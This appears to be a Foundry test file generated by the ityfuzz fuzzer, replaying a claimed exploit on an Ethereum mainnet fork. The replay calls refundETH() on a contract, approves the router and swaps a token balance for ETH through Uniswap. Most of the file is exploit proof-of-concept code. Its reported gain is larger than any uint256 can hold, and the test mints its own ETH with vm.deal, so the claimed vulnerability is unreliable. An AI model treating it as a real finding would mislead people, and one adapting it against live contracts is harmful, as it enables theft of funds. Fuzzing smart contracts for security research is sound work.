// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x067d0f9089743271058d4bf2a1a29f4e9c6fdd1b,0x4107a0a4a50ac2c4cc8c5a3954bc01ff134506b2,0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0x531110418d8591C92e9cBBFC722Db8FFb604FAFD -c eth --onchain-block-number 16653390 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 115792089237316195423570985008687907853269984665640564039457584007913129639935000000 more than owed 0, net earned = 115792089237316195423570985008687907853269984665640564039457584007913129639935000000wei (115792089237316195423570985008687907853269984665640564039457ETH)

================ Trace ================
[38;2;211;29;219m[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb[0m
   ├─[1] [38;2;17;254;136m0xC36442b4a4522E871399CD717aBDD847Ab11FE88[0m.[38;2;255;123;114mrefundETH[0m()
   │  ├─[2] [38;2;211;29;219m[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb[0m.fallback()
   ├─[1] [38;2;0;118;255mRouter[0m.[38;2;255;123;114mswapExactTokensForETH[0m(100% Balance, 0, path:([38;2;17;254;136m0xC36442b4a4522E871399CD717aBDD847Ab11FE88[0m → WETH), address(this), block.timestamp);
   │  │  └─ ← ()


 */

contract C067d is Test {
    function setUp() public {
        vm.createSelectFork("eth", 16653390);
    }

    function test() public {
        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        
        0xC36442b4a4522E871399CD717aBDD847Ab11FE88.call(abi.encodeWithSignature(
            "refundETH()"
        )); 
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).balanceOf(address(this));
        IERC20(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
        liq_path0[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
